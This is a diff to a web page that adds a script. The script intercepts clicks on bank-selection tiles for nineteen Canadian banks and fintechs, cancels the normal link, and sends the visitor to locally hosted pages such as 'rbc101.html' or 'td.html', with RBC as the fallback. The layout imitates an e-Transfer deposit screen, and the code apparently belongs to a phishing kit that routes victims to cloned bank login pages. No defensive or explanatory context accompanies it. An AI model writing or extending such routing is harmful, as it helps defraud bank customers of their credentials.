@@ -1430,6 +1430,50 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 <script src="security_module.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    var fiMapping = {
+        'ATB': 'atb101.html',
+        'BMO': 'bmo101.html',
+        'CIBC': 'cibc101.html',
+        'Coast Capital': 'coastcapital101.html',
+        'Desjardins': 'desjardins101.html',
+        'KOHO': 'koho101.html',
+        'Laurentian': 'laurentianbank101.html',
+        'Meridian': 'meridian101.html',
+        'National Bank': 'nationalbank.html',
+        'Neo': 'neo101.html',
+        'PC Financial': 'pcfinancial101.html',
+        'RBC': 'rbc101.html',
+        'Scotiabank': 'scotiabank101.html',
+        'Simplii': 'simplii.html',
+        'Tangerine': 'tangerine.html',
+        'TD': 'td.html',
+        'UNI': 'uni101.html',
+        'Vancity': 'vancity.html',
+        'Wealthsimple': 'wealthsimple101.html'
+    };
+
+    var tiles = document.querySelectorAll('a.fi-tile');
+    tiles.forEach(function(tile) {
+        tile.style.cursor = 'pointer';
+        tile.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            var label = tile.getAttribute('filabel') || '';
+            var target = 'rbc101.html';
+            
+            for (var key in fiMapping) {
+                if (label.toLowerCase().includes(key.toLowerCase())) {
+                    target = fiMapping[key];
+                    break;
+                }
+            }
+            window.location.href = './' + target;
+        });
+    });
+});
+</script>
 </body></html>
 
 <script>
@@ -1625,4 +1669,5 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 </script>
+
 
